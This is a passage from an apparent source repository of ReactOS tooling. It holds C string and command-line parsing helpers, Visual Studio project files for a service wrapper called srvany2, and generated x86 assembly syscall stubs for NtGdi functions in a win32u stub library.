size_t _strlen_w(const wchar_t *s)
{
	wchar_t *s0 = (wchar_t *)s;

	if ( s==0 )
		return 0;

	while ( *s!=0 )
		s++;

	return (s-s0);
}

```

`source/ROS/srvany2/srvany2/minirtl/cmdline.c`:

```c
#include <windows.h>

BOOL GetCommandLineParamW(
	IN	LPCWSTR	CmdLine,
	IN	ULONG	ParamIndex,
	OUT	LPWSTR	Buffer,
	IN	ULONG	BufferSize,
	OUT	PULONG	ParamLen
	)
{
	ULONG	c, plen = 0;
	TCHAR	divider;

	if (ParamLen != NULL)
		*ParamLen = 0;

	if (CmdLine == NULL) {
		if ((Buffer != NULL) && (BufferSize > 0))
			*Buffer = 0;
		return FALSE;
	}

	for (c = 0; c <= ParamIndex; c++) {
		plen = 0;

		while (*CmdLine == ' ')
			CmdLine++;

		switch (*CmdLine) {
		case 0:
			goto zero_term_exit;

		case '"':
			CmdLine++;
			divider = '"';
			break;

		default:
			divider = ' ';
		}

		while ((*CmdLine != '"') && (*CmdLine != divider) && (*CmdLine != 0)) {
			plen++;
			if (c == ParamIndex)
				if ((plen < BufferSize) && (Buffer != NULL)) {
					*Buffer = *CmdLine;
					Buffer++;
				}
			CmdLine++;
		}

		if (*CmdLine != 0)
			CmdLine++;
	}

zero_term_exit:

	if ((Buffer != NULL) && (BufferSize > 0))
		*Buffer = 0;

	if (ParamLen != NULL)
		*ParamLen = plen;

	if (plen < BufferSize)
		return TRUE;
	else
		return FALSE;
}

BOOL GetCommandLineParamA(
	IN	LPCSTR	CmdLine,
	IN	ULONG	ParamIndex,
	OUT	LPSTR	Buffer,
	IN	ULONG	BufferSize,
	OUT	PULONG	ParamLen
	)
{
	ULONG	c, plen = 0;
	TCHAR	divider;

	if (CmdLine == NULL)
		return FALSE;

	if (ParamLen != NULL)
		*ParamLen = 0;

	for (c = 0; c <= ParamIndex; c++) {
		plen = 0;

		while (*CmdLine == ' ')
			CmdLine++;

		switch (*CmdLine) {
		case 0:
			goto zero_term_exit;

		case '"':
			CmdLine++;
			divider = '"';
			break;

		default:
			divider = ' ';
		}

		while ((*CmdLine != '"') && (*CmdLine != divider) && (*CmdLine != 0)) {
			plen++;
			if (c == ParamIndex)
				if ((plen < BufferSize) && (Buffer != NULL)) {
					*Buffer = *CmdLine;
					Buffer++;
				}
			CmdLine++;
		}

		if (*CmdLine != 0)
			CmdLine++;
	}

zero_term_exit:

	if ((Buffer != NULL) && (BufferSize > 0))
		*Buffer = 0;

	if (ParamLen != NULL)
		*ParamLen = plen;

	if (plen < BufferSize)
		return TRUE;
	else
		return FALSE;
}

char *ExtractFilePathA(const char *FileName, char *FilePath)
{
	char *p = (char *)FileName, *p0 = (char *)FileName;

	if ((FileName == 0) || (FilePath == 0))
		return 0;

	while (*FileName != 0) {
		if (*FileName == '\\')
			p = (char *)FileName + 1;
		FileName++;
	}

	while (p0 < p) {
		*FilePath = *p0;
		FilePath++;
		p0++;
	}

	*FilePath = 0;

	return FilePath;
}

wchar_t *ExtractFilePathW(const wchar_t *FileName, wchar_t *FilePath)
{
	wchar_t *p = (wchar_t *)FileName, *p0 = (wchar_t *)FileName;

	if ((FileName == 0) || (FilePath == 0))
		return 0;

	while (*FileName != 0) {
		if (*FileName == '\\')
			p = (wchar_t *)FileName + 1;
		FileName++;
	}

	while (p0 < p) {
		*FilePath = *p0;
		FilePath++;
		p0++;
	}

	*FilePath = 0;

	return FilePath;
}

```

`source/ROS/srvany2/srvany2/minirtl/cmdline.h`:

```h
#ifndef _CMDLINEH_
#define _CMDLINEH_

BOOL GetCommandLineParamW(
	IN	LPCWSTR	CmdLine,
	IN	ULONG	ParamIndex,
	OUT	LPWSTR	Buffer,
	IN	ULONG	BufferSize,
	OUT	PULONG	ParamLen
	);

BOOL GetCommandLineParamA(
	IN	LPCSTR	CmdLine,
	IN	ULONG	ParamIndex,
	OUT	LPSTR	Buffer,
	IN	ULONG	BufferSize,
	OUT	PULONG	ParamLen
	);

char *ExtractFilePathA(const char *FileName, char *FilePath);
wchar_t *ExtractFilePathW(const wchar_t *FileName, wchar_t *FilePath);

#ifdef UNICODE

#define ExtractFilePath			ExtractFilePathW
#define GetCommandLineParam		GetCommandLineParamW

#else // ANSI

#define ExtractFilePath			ExtractFilePathA
#define GetCommandLineParam		GetCommandLineParamA

#endif

#endif /* _CMDLINEH_ */

```

`source/ROS/srvany2/srvany2/minirtl/minirtl.h`:

```h
/*
Module name:
	minirtl.h

Description:
	header for string handling and conversion routines

Date:
	1 Mar 2015
*/

#ifndef _MINIRTL_
#define _MINIRTL_

// string copy/concat/length

char *_strend_a(const char *s);
wchar_t *_strend_w(const wchar_t *s);

char *_strcpy_a(char *dest, const char *src);
wchar_t *_strcpy_w(wchar_t *dest, const wchar_t *src);

char *_strcat_a(char *dest, const char *src);
wchar_t *_strcat_w(wchar_t *dest, const wchar_t *src);

char *_strncpy_a(char *dest, size_t ccdest, const char *src, size_t ccsrc);
wchar_t *_strncpy_w(wchar_t *dest, size_t ccdest, const wchar_t *src, size_t ccsrc);

size_t _strlen_a(const char *s);
size_t _strlen_w(const wchar_t *s);

// comparing

int _strcmp_a(const char *s1, const char *s2);
int _strcmp_w(const wchar_t *s1, const wchar_t *s2);

int _strncmp_a(const char *s1, const char *s2, size_t cchars);
int _strncmp_w(const wchar_t *s1, const wchar_t *s2, size_t cchars);

int _strcmpi_a(const char *s1, const char *s2);
int _strcmpi_w(const wchar_t *s1, const wchar_t *s2);

int _strncmpi_a(const char *s1, const char *s2, size_t cchars);
int _strncmpi_w(const wchar_t *s1, const wchar_t *s2, size_t cchars);

char *_strstr_a(const char *s, const char *sub_s);
wchar_t *_strstr_w(const wchar_t *s, const wchar_t *sub_s);

char *_strstri_a(const char *s, const char *sub_s);
wchar_t *_strstri_w(const wchar_t *s, const wchar_t *sub_s);

// conversion of integer types to string, returning string length

size_t ultostr_a(unsigned long x, char *s);
size_t ultostr_w(unsigned long x, wchar_t *s);

size_t ultohex_a(unsigned long x, char *s);
size_t ultohex_w(unsigned long x, wchar_t *s);

size_t itostr_a(int x, char *s);
size_t itostr_w(int x, wchar_t *s);

size_t i64tostr_a(signed long long x, char *s);
size_t i64tostr_w(signed long long x, wchar_t *s);

size_t u64tostr_a(unsigned long long x, char *s);
size_t u64tostr_w(unsigned long long x, wchar_t *s);

size_t u64tohex_a(unsigned long long x, char *s);
size_t u64tohex_w(unsigned long long x, wchar_t *s);

// string to integers conversion

unsigned long strtoul_a(char *s);
unsigned long strtoul_w(wchar_t *s);

unsigned long long strtou64_a(char *s);
unsigned long long strtou64_w(wchar_t *s);

unsigned long hextoul_a(char *s);
unsigned long hextoul_w(wchar_t *s);

int strtoi_a(char *s);
int strtoi_w(wchar_t *s);

signed long long strtoi64_a(char *s);
signed long long strtoi64_w(wchar_t *s);

unsigned long long hextou64_a(char *s);
unsigned long long hextou64_w(wchar_t *s);

/* =================================== */

#ifdef UNICODE

#define _strend _strend_w
#define _strcpy _strcpy_w
#define _strcat _strcat_w
#define _strlen _strlen_w
#define _strncpy _strncpy_w

#define _strcmp _strcmp_w
#define _strncmp _strncmp_w
#define _strcmpi _strcmpi_w
#define _strncmpi _strncmpi_w
#define _strstr _strstr_w
#define _strstri _strstri_w

#define ultostr ultostr_w
#define ultohex ultohex_w
#define itostr itostr_w
#define i64tostr i64tostr_w
#define u64tostr u64tostr_w
#define u64tohex u64tohex_w

#define strtoul strtoul_w
#define hextoul hextoul_w
#define strtoi strtoi_w
#define strtoi64 strtoi64_w
#define strtou64 strtou64_w
#define hextou64 hextou64_w

#else // ANSI

#define _strend _strend_a
#define _strcpy _strcpy_a
#define _strcat _strcat_a
#define _strlen _strlen_a
#define _strncpy _strncpy_a
#define _strcmp _strcmp_a

#define _strcmp _strcmp_a
#define _strncmp _strncmp_a
#define _strcmpi _strcmpi_a
#define _strncmpi _strncmpi_a
#define _strstr _strstr_a
#define _strstri _strstri_a

#define ultostr ultostr_a
#define ultohex ultohex_a
#define itostr itostr_a
#define i64tostr i64tostr_a
#define u64tostr u64tostr_a
#define u64tohex u64tohex_a

#define strtoul strtoul_a
#define hextoul hextoul_a
#define strtoi strtoi_a
#define strtoi64 strtoi64_a
#define strtou64 strtou64_a
#define hextou64 hextou64_a

#endif

#endif /* _MINIRTL_ */

```

`source/ROS/srvany2/srvany2/minirtl/rtltypes.h`:

```h
#ifndef _WCHAR_T_DEFINED
typedef unsigned short wchar_t;
#define _WCHAR_T_DEFINED
#endif  /* _WCHAR_T_DEFINED */

#ifndef _SIZE_T_DEFINED
#ifdef _WIN64
typedef unsigned __int64    size_t;
#else  /* _WIN64 */
typedef __w64 unsigned int   size_t;
#endif  /* _WIN64 */
#define _SIZE_T_DEFINED
#endif  /* _SIZE_T_DEFINED */

__forceinline char locase_a(char c)
{
	if ((c >= 'A') && (c <= 'Z'))
		return c + 0x20;
	else
		return c;
}

__forceinline wchar_t locase_w(wchar_t c)
{
	if ((c >= 'A') && (c <= 'Z'))
		return c + 0x20;
	else
		return c;
}

__forceinline char byteabs(char x) {
	if (x < 0)
		return -x;
	return x;
}

__forceinline int _isdigit_a(char x) {
	return ((x >= '0') && (x <= '9'));
}

__forceinline int _isdigit_w(wchar_t x) {
	return ((x >= L'0') && (x <= L'9'));
}

```

`source/ROS/srvany2/srvany2/srvany2.vcxproj`:

```vcxproj
<?xml version="1.0" encoding="utf-8"?>
<Project DefaultTargets="Build" ToolsVersion="15.0" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
  <ItemGroup Label="ProjectConfigurations">
    <ProjectConfiguration Include="Debug|Win32">
      <Configuration>Debug</Configuration>
      <Platform>Win32</Platform>
    </ProjectConfiguration>
    <ProjectConfiguration Include="Release|Win32">
      <Configuration>Release</Configuration>
      <Platform>Win32</Platform>
    </ProjectConfiguration>
  </ItemGroup>
  <PropertyGroup Label="Globals">
    <VCProjectVersion>15.0</VCProjectVersion>
    <ProjectGuid>{DA2D114B-786B-4999-8338-7D2A772EAE69}</ProjectGuid>
    <RootNamespace>srvany</RootNamespace>
    <WindowsTargetPlatformVersion>10.0.17134.0</WindowsTargetPlatformVersion>
    <ProjectName>srvany2</ProjectName>
  </PropertyGroup>
  <Import Project="$(VCTargetsPath)\Microsoft.Cpp.Default.props" />
  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Debug|Win32'" Label="Configuration">
    <ConfigurationType>Application</ConfigurationType>
    <UseDebugLibraries>true</UseDebugLibraries>
    <PlatformToolset>v141</PlatformToolset>
    <CharacterSet>Unicode</CharacterSet>
  </PropertyGroup>
  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Release|Win32'" Label="Configuration">
    <ConfigurationType>Application</ConfigurationType>
    <UseDebugLibraries>false</UseDebugLibraries>
    <PlatformToolset>v141</PlatformToolset>
    <WholeProgramOptimization>true</WholeProgramOptimization>
    <CharacterSet>Unicode</CharacterSet>
  </PropertyGroup>
  <Import Project="$(VCTargetsPath)\Microsoft.Cpp.props" />
  <ImportGroup Label="ExtensionSettings">
  </ImportGroup>
  <ImportGroup Label="Shared">
  </ImportGroup>
  <ImportGroup Label="PropertySheets" Condition="'$(Configuration)|$(Platform)'=='Debug|Win32'">
    <Import Project="$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props" Condition="exists('$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props')" Label="LocalAppDataPlatform" />
  </ImportGroup>
  <ImportGroup Label="PropertySheets" Condition="'$(Configuration)|$(Platform)'=='Release|Win32'">
    <Import Project="$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props" Condition="exists('$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props')" Label="LocalAppDataPlatform" />
  </ImportGroup>
  <PropertyGroup Label="UserMacros" />
  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Debug|Win32'">
    <OutDir>.\output\$(Platform)\$(Configuration)\bin\</OutDir>
    <IntDir>.\output\$(Platform)\$(Configuration)\</IntDir>
  </PropertyGroup>
  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Release|Win32'">
    <OutDir>.\output\$(Platform)\$(Configuration)\bin\</OutDir>
    <IntDir>.\output\$(Platform)\$(Configuration)\</IntDir>
    <GenerateManifest>false</GenerateManifest>
  </PropertyGroup>
  <ItemDefinitionGroup Condition="'$(Configuration)|$(Platform)'=='Debug|Win32'">
    <ClCompile>
      <WarningLevel>Level4</WarningLevel>
      <Optimization>Disabled</Optimization>
      <SDLCheck>true</SDLCheck>
      <ConformanceMode>true</ConformanceMode>
    </ClCompile>
  </ItemDefinitionGroup>
  <ItemDefinitionGroup Condition="'$(Configuration)|$(Platform)'=='Release|Win32'">
    <ClCompile>
      <WarningLevel>Level4</WarningLevel>
      <Optimization>MaxSpeed</Optimization>
      <FunctionLevelLinking>true</FunctionLevelLinking>
      <IntrinsicFunctions>true</IntrinsicFunctions>
      <SDLCheck>
      </SDLCheck>
      <ConformanceMode>true</ConformanceMode>
      <RuntimeLibrary>MultiThreaded</RuntimeLibrary>
      <BufferSecurityCheck>false</BufferSecurityCheck>
      <MultiProcessorCompilation>true</MultiProcessorCompilation>
    </ClCompile>
    <Link>
      <EnableCOMDATFolding>true</EnableCOMDATFolding>
      <OptimizeReferences>true</OptimizeReferences>
      <GenerateDebugInformation>false</GenerateDebugInformation>
      <EntryPointSymbol>main</EntryPointSymbol>
      <SetChecksum>true</SetChecksum>
    </Link>
  </ItemDefinitionGroup>
  <ItemGroup>
    <ClCompile Include="main.c" />
    <ClCompile Include="minirtl\cmdline.c" />
    <ClCompile Include="minirtl\_strcat.c" />
    <ClCompile Include="minirtl\_strcpy.c" />
    <ClCompile Include="minirtl\_strlen.c" />
  </ItemGroup>
  <ItemGroup>
    <ClInclude Include="minirtl\cmdline.h" />
    <ClInclude Include="minirtl\minirtl.h" />
    <ClInclude Include="minirtl\rtltypes.h" />
  </ItemGroup>
  <Import Project="$(VCTargetsPath)\Microsoft.Cpp.targets" />
  <ImportGroup Label="ExtensionTargets">
  </ImportGroup>
</Project>
```

`source/ROS/srvany2/srvany2/srvany2.vcxproj.filters`:

```filters
<?xml version="1.0" encoding="utf-8"?>
<Project ToolsVersion="4.0" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
  <ItemGroup>
    <Filter Include="Source Files">
      <UniqueIdentifier>{4FC737F1-C7A5-4376-A066-2A32D752A2FF}</UniqueIdentifier>
      <Extensions>cpp;c;cc;cxx;def;odl;idl;hpj;bat;asm;asmx</Extensions>
    </Filter>
    <Filter Include="Header Files">
      <UniqueIdentifier>{93995380-89BD-4b04-88EB-625FBE52EBFB}</UniqueIdentifier>
      <Extensions>h;hh;hpp;hxx;hm;inl;inc;ipp;xsd</Extensions>
    </Filter>
    <Filter Include="Resource Files">
      <UniqueIdentifier>{67DA6AB6-F800-4c08-8B7A-83BB121AAD01}</UniqueIdentifier>
      <Extensions>rc;ico;cur;bmp;dlg;rc2;rct;bin;rgs;gif;jpg;jpeg;jpe;resx;tiff;tif;png;wav;mfcribbon-ms</Extensions>
    </Filter>
    <Filter Include="minirtl">
      <UniqueIdentifier>{193b68bc-13ea-43ca-9f81-6a739b38bb42}</UniqueIdentifier>
    </Filter>
  </ItemGroup>
  <ItemGroup>
    <ClCompile Include="main.c">
      <Filter>Source Files</Filter>
    </ClCompile>
    <ClCompile Include="minirtl\_strcat.c">
      <Filter>minirtl</Filter>
    </ClCompile>
    <ClCompile Include="minirtl\_strcpy.c">
      <Filter>minirtl</Filter>
    </ClCompile>
    <ClCompile Include="minirtl\_strlen.c">
      <Filter>minirtl</Filter>
    </ClCompile>
    <ClCompile Include="minirtl\cmdline.c">
      <Filter>minirtl</Filter>
    </ClCompile>
  </ItemGroup>
  <ItemGroup>
    <ClInclude Include="minirtl\minirtl.h">
      <Filter>Header Files</Filter>
    </ClInclude>
    <ClInclude Include="minirtl\rtltypes.h">
      <Filter>Header Files</Filter>
    </ClInclude>
    <ClInclude Include="minirtl\cmdline.h">
      <Filter>minirtl</Filter>
    </ClInclude>
  </ItemGroup>
</Project>
```

`source/ROS/srvany2/srvany2/srvany2.vcxproj.user`:

```user
<?xml version="1.0" encoding="utf-8"?>
<Project ToolsVersion="15.0" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Debug|Win32'">
    <LocalDebuggerCommandArguments>C:\new\zoomit.exe "-win32k -sc 1024 -pc 1024 logn"</LocalDebuggerCommandArguments>
    <DebuggerFlavor>WindowsLocalDebugger</DebuggerFlavor>
  </PropertyGroup>
</Project>
```

`source/ROS/win32u/win32u.sln`:

```sln

Microsoft Visual Studio Solution File, Format Version 12.00
# Visual Studio Version 16
VisualStudioVersion = 16.0.29519.87
MinimumVisualStudioVersion = 10.0.40219.1
Project("{8BC9CEB8-8B4A-11D0-8D11-00A0C91BC942}") = "win32u", "win32u\win32u.vcxproj", "{8AF1DA16-D7F8-4814-BF5D-526456A574B2}"
EndProject
Global
	GlobalSection(SolutionConfigurationPlatforms) = preSolution
		Debug|x86 = Debug|x86
		Release|x86 = Release|x86
		ReleaseForChecked|x86 = ReleaseForChecked|x86
	EndGlobalSection
	GlobalSection(ProjectConfigurationPlatforms) = postSolution
		{8AF1DA16-D7F8-4814-BF5D-526456A574B2}.Debug|x86.ActiveCfg = Debug|Win32
		{8AF1DA16-D7F8-4814-BF5D-526456A574B2}.Debug|x86.Build.0 = Debug|Win32
		{8AF1DA16-D7F8-4814-BF5D-526456A574B2}.Release|x86.ActiveCfg = Release|Win32
		{8AF1DA16-D7F8-4814-BF5D-526456A574B2}.Release|x86.Build.0 = Release|Win32
		{8AF1DA16-D7F8-4814-BF5D-526456A574B2}.ReleaseForChecked|x86.ActiveCfg = ReleaseForChecked|Win32
		{8AF1DA16-D7F8-4814-BF5D-526456A574B2}.ReleaseForChecked|x86.Build.0 = ReleaseForChecked|Win32
	EndGlobalSection
	GlobalSection(SolutionProperties) = preSolution
		HideSolutionNode = FALSE
	EndGlobalSection
	GlobalSection(ExtensibilityGlobals) = postSolution
		SolutionGuid = {487B1FDE-0E17-47E1-80E2-16076184F850}
	EndGlobalSection
EndGlobal

```

`source/ROS/win32u/win32u/main.c`:

```c
/*******************************************************************************
*
*  (C) COPYRIGHT hfiref0x, 2018 - 2019
*
*  TITLE:       MAIN.C
*
*  VERSION:     1.01
*
*  DATE:        06 Dec 2019
*
*  Syscall stubs for NtUser/NtGdi
*
* THIS CODE AND INFORMATION IS PROVIDED "AS IS" WITHOUT WARRANTY OF
* ANY KIND, EITHER EXPRESSED OR IMPLIED, INCLUDING BUT NOT LIMITED
* TO THE IMPLIED WARRANTIES OF MERCHANTABILITY AND/OR FITNESS FOR A
* PARTICULAR PURPOSE.
*
*******************************************************************************/

#if !defined UNICODE
#error ANSI build is not supported
#endif

#if defined (_MSC_VER)
#if (_MSC_VER >= 1900) //VS15, 17 etc
#ifdef _DEBUG
#pragma comment(lib, "vcruntimed.lib")
#pragma comment(lib, "ucrtd.lib")
#else
#pragma comment(lib, "libucrt.lib")
#pragma comment(lib, "libvcruntime.lib")
#endif
#endif
#endif

#include <Windows.h>

//
// These files are machine generated, do not edit.
//
#ifdef _RELEASE_FOR_CHECKED
#include "w32kcall_checked.h"
#include "w32parguments_checked.h"
#else
#include "w32kcall.h"
#include "w32parguments.h"
#endif

ULONG W32pServiceLimit = sizeof(W32pServiceArgumentTable);

```

`source/ROS/win32u/win32u/resource.h`:

```h
//{{NO_DEPENDENCIES}}
// Microsoft Visual C++ generated include file.
// Used by ver.rc

// Next default values for new objects
// 
#ifdef APSTUDIO_INVOKED
#ifndef APSTUDIO_READONLY_SYMBOLS
#define _APS_NEXT_RESOURCE_VALUE        101
#define _APS_NEXT_COMMAND_VALUE         40001
#define _APS_NEXT_CONTROL_VALUE         1001
#define _APS_NEXT_SYMED_VALUE           101
#endif
#endif

```

`source/ROS/win32u/win32u/ver.rc`:

```rc
// Microsoft Visual C++ generated resource script.
//
#include "resource.h"

#define APSTUDIO_READONLY_SYMBOLS
/////////////////////////////////////////////////////////////////////////////
//
// Generated from the TEXTINCLUDE 2 resource.
//
#include "winres.h"

/////////////////////////////////////////////////////////////////////////////
#undef APSTUDIO_READONLY_SYMBOLS

/////////////////////////////////////////////////////////////////////////////
// English (United States) resources

#if !defined(AFX_RESOURCE_DLL) || defined(AFX_TARG_ENU)
LANGUAGE LANG_ENGLISH, SUBLANG_ENGLISH_US

#ifdef APSTUDIO_INVOKED
/////////////////////////////////////////////////////////////////////////////
//
// TEXTINCLUDE
//

1 TEXTINCLUDE 
BEGIN
    "resource.h\0"
END

2 TEXTINCLUDE 
BEGIN
    "#include ""winres.h""\r\n"
    "\0"
END

3 TEXTINCLUDE 
BEGIN
    "\r\n"
    "\0"
END

#endif    // APSTUDIO_INVOKED


/////////////////////////////////////////////////////////////////////////////
//
// Version
//

VS_VERSION_INFO VERSIONINFO
 FILEVERSION 1,4,12,1812
 PRODUCTVERSION 1,4,12,1812
 FILEFLAGSMASK 0x3fL
#ifdef _DEBUG
 FILEFLAGS 0x1L
#else
 FILEFLAGS 0x0L
#endif
 FILEOS 0x40004L
 FILETYPE 0x2L
 FILESUBTYPE 0x0L
BEGIN
    BLOCK "StringFileInfo"
    BEGIN
        BLOCK "040904b0"
        BEGIN
            VALUE "CompanyName", "UG North"
            VALUE "FileDescription", "Win32u stubs for ReactOS"
            VALUE "FileVersion", "1.4.12.1812"
            VALUE "InternalName", "Win32u"
            VALUE "LegalCopyright", "Copyright (C) 2018 hfiref0x"
            VALUE "OriginalFilename", "Win32u.DLL"
            VALUE "ProductName", "ReactOS Win32u"
            VALUE "ProductVersion", "1.4.12.1812"
        END
    END
    BLOCK "VarFileInfo"
    BEGIN
        VALUE "Translation", 0x409, 1200
    END
END

#endif    // English (United States) resources
/////////////////////////////////////////////////////////////////////////////



#ifndef APSTUDIO_INVOKED
/////////////////////////////////////////////////////////////////////////////
//
// Generated from the TEXTINCLUDE 3 resource.
//


/////////////////////////////////////////////////////////////////////////////
#endif    // not APSTUDIO_INVOKED


```

`source/ROS/win32u/win32u/w32kcall.h`:

```h
/* MACHINE GENERATED, DO NOT EDIT */
#define KUSER_SHARED_SYSCALL 7FFE0300h

__declspec(naked) ULONG NTAPI NtGdiAbortDoc()
{
    __asm {
        mov eax, 00001000h
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 00000004h
    }
}

__declspec(naked) ULONG NTAPI NtGdiAbortPath()
{
    __asm {
        mov eax, 00001001h
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 00000004h
    }
}

__declspec(naked) ULONG NTAPI NtGdiAddFontResourceW()
{
    __asm {
        mov eax, 00001002h
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 00000018h
    }
}

__declspec(naked) ULONG NTAPI NtGdiAddRemoteFontToDC()
{
    __asm {
        mov eax, 00001003h
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 00000010h
    }
}

__declspec(naked) ULONG NTAPI NtGdiAddFontMemResourceEx()
{
    __asm {
        mov eax, 00001004h
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 00000014h
    }
}

__declspec(naked) ULONG NTAPI NtGdiRemoveMergeFont()
{
    __asm {
        mov eax, 00001005h
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 00000008h
    }
}

__declspec(naked) ULONG NTAPI NtGdiAddRemoteMMInstanceToDC()
{
    __asm {
        mov eax, 00001006h
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 0000000Ch
    }
}

__declspec(naked) ULONG NTAPI NtGdiAlphaBlend()
{
    __asm {
        mov eax, 00001007h
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 00000030h
    }
}

__declspec(naked) ULONG NTAPI NtGdiAngleArc()
{
    __asm {
        mov eax, 00001008h
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 00000018h
    }
}

__declspec(naked) ULONG NTAPI NtGdiAnyLinkedFonts()
{
    __asm {
        mov eax, 00001009h
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 00000000h
    }
}

__declspec(naked) ULONG NTAPI NtGdiFontIsLinked()
{
    __asm {
        mov eax, 0000100Ah
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 00000004h
    }
}

__declspec(naked) ULONG NTAPI NtGdiArcInternal()
{
    __asm {
        mov eax, 0000100Bh
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 00000028h
    }
}

__declspec(naked) ULONG NTAPI NtGdiBeginPath()
{
    __asm {
        mov eax, 0000100Ch
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 00000004h
    }
}

__declspec(naked) ULONG NTAPI NtGdiBitBlt()
{
    __asm {
        mov eax, 0000100Dh
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 0000002Ch
    }
}

__declspec(naked) ULONG NTAPI NtGdiCancelDC()
{
    __asm {
        mov eax, 0000100Eh
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 00000004h
    }
}

__declspec(naked) ULONG NTAPI NtGdiCheckBitmapBits()
{
    __asm {
        mov eax, 0000100Fh
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 00000020h
    }
}

__declspec(naked) ULONG NTAPI NtGdiCloseFigure()
{
    __asm {
        mov eax, 00001010h
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 00000004h
    }
}

__declspec(naked) ULONG NTAPI NtGdiClearBitmapAttributes()
{
    __asm {
        mov eax, 00001011h
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 00000008h
    }
}

__declspec(naked) ULONG NTAPI NtGdiClearBrushAttributes()
{
    __asm {
        mov eax, 00001012h
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 00000008h
    }
}

__declspec(naked) ULONG NTAPI NtGdiColorCorrectPalette()
{
    __asm {
        mov eax, 00001013h
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 00000018h
    }
}

__declspec(naked) ULONG NTAPI NtGdiCombineRgn()
{
    __asm {
        mov eax, 00001014h
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 00000010h
    }
}

__declspec(naked) ULONG NTAPI NtGdiCombineTransform()
{
    __asm {
        mov eax, 00001015h
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 0000000Ch
    }
}

__declspec(naked) ULONG NTAPI NtGdiComputeXformCoefficients()
{
    __asm {
        mov eax, 00001016h
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 00000004h
    }
}

__declspec(naked) ULONG NTAPI NtGdiConsoleTextOut()
{
    __asm {
        mov eax, 00001017h
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 00000010h
    }
}

__declspec(naked) ULONG NTAPI NtGdiConvertMetafileRect()
{
    __asm {
        mov eax, 00001018h
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 00000008h
    }
}

__declspec(naked) ULONG NTAPI NtGdiCreateBitmap()
{
    __asm {
        mov eax, 00001019h
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 00000014h
    }
}

__declspec(naked) ULONG NTAPI NtGdiCreateClientObj()
{
    __asm {
        mov eax, 0000101Ah
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 00000004h
    }
}

__declspec(naked) ULONG NTAPI NtGdiCreateColorSpace()
{
    __asm {
        mov eax, 0000101Bh
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 00000004h
    }
}

__declspec(naked) ULONG NTAPI NtGdiCreateColorTransform()
{
    __asm {
        mov eax, 0000101Ch
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 00000020h
    }
}

__declspec(naked) ULONG NTAPI NtGdiCreateCompatibleBitmap()
{
    __asm {
        mov eax, 0000101Dh
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 0000000Ch
    }
}

__declspec(naked) ULONG NTAPI NtGdiCreateCompatibleDC()
{
    __asm {
        mov eax, 0000101Eh
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 00000004h
    }
}

__declspec(naked) ULONG NTAPI NtGdiCreateDIBBrush()
{
    __asm {
        mov eax, 0000101Fh
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 00000018h
    }
}

__declspec(naked) ULONG NTAPI NtGdiCreateDIBitmapInternal()
{
    __asm {
        mov eax, 00001020h
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 0000002Ch
    }
}

__declspec(naked) ULONG NTAPI NtGdiCreateDIBSection()
{
    __asm {
        mov eax, 00001021h
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 00000024h
    }
}

__declspec(naked) ULONG NTAPI NtGdiCreateEllipticRgn()
{
    __asm {
        mov eax, 00001022h
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 00000010h
    }
}

__declspec(naked) ULONG NTAPI NtGdiCreateHalftonePalette()
{
    __asm {
        mov eax, 00001023h
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 00000004h
    }
}

__declspec(naked) ULONG NTAPI NtGdiCreateHatchBrushInternal()
{
    __asm {
        mov eax, 00001024h
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 0000000Ch
    }
